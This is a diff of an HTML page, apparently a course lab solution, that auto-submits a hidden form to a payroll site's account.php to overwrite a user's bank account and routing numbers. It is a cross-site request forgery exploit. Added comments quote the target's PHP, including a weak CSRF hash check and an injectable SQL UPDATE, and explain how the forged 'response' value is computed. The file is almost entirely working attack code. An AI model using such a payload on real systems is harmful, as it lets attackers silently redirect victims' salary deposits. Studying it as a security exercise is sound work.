@@ -7,12 +7,66 @@
     <body onload="document.forms[0].submit()">
         <form action="http://payroll.gatech.edu/account.php" onsubmit="" method="POST">
             <!-- account and routing were found from running 'get_bank_info rpatel475' on the terminal -->
+                <!-- 
+                    account.php:53
+                        <input id="account" type="number" name="account" value="<?php echo $account ?>">
+                -->
                 <input type='hidden' name='account' value='2553558378'>
+                <!-- 
+                    account.php:55
+                        <input id="route" type="number" name="routing" value="<?php echo $routing ?>">
+                -->
                 <input type='hidden' name='routing' value='3493543071'>
+                <!-- 
+                    account.php:60
+                        <button class="btn submit" name="action" value="save">Save</button>
+
+                    account.php:14-32
+                        // handle the form submission
+                        $action = @$_POST['action'];
+
+                        if ($action == 'save' && $_POST['U3VtbWVyMjAxOVRhcmdldDFFYXN0ZXJFZ2cNCg'] == 'U3VtbWVyMjAxOVRhcmdldDFFYXN0ZXJFZ2cNCg') {
+                            // verify CSRF protection
+                            $expected = 1;
+                            $teststr = $_POST['account'].$_POST['challenge'].$_POST['routing'];
+                            for ($i = 0; $i < strlen($teststr); $i++) {
+                                $expected = (13337 * $expected + ord($teststr[$i])) % 100000;
+                            }
+                            if ($_POST['response'] != $expected) {
+                                notify('CSRF attempt prevented!'.$teststr.'--'.$_POST['response'].' != '.$expected, -1);
+                            } else {
+                                $accounting = ($_POST['account']).':'.($_POST['routing']);
+                                $db->query("UPDATE users SET accounting='$accounting' WHERE user_id='".$auth->user_id()."'");
+                                notify('Changes saved');
+                            }
+                            
+                        }
+                -->
                 <input type='hidden' name='action' value='save'>
-                <!-- auth.php:67-73 -->
+                <!-- acouunt.php:67-73 
+                    Geneterates hash for 'response'
+                    // fairly trivial string hashing function
+                    String.prototype.hashCode = function(){
+                    var hash = 1;
+                    for (i = 0; i < this.length; i++) {
+                        hash = (13337 * hash + this.charCodeAt(i)) % 100000;
+                    }
+                    return hash;
+                    }
+                -->
                 <input type='hidden' name='response' value='55899'>
+                <!--  
+                    account.php: 56
+                        <input id="csrfc" type="hidden" name="challenge" value="<?php echo $_SESSION['csrf_token'] ?>">
+                    account.php:11-12
+                        // initiate csrf prevention
+                        if (!isset($_SESSION['csrf_token'])) $_SESSION['csrf_token'] = mt_rand();
+                -->
                 <input type='hidden' name='challenge' value=''>
+                <!-- 
+                    account.php:58
+                        <input type="hidden" name="U3VtbWVyMjAxOVRhcmdldDFFYXN0ZXJFZ2cNCg" value="U3VtbWVyMjAxOVRhcmdldDFFYXN0ZXJFZ2cNCg">
+                -->
                 <input type='hidden' name='U3VtbWVyMjAxOVRhcmdldDFFYXN0ZXJFZ2cNCg' value='U3VtbWVyMjAxOVRhcmdldDFFYXN0ZXJFZ2cNCg'>
         </form>
     </body>
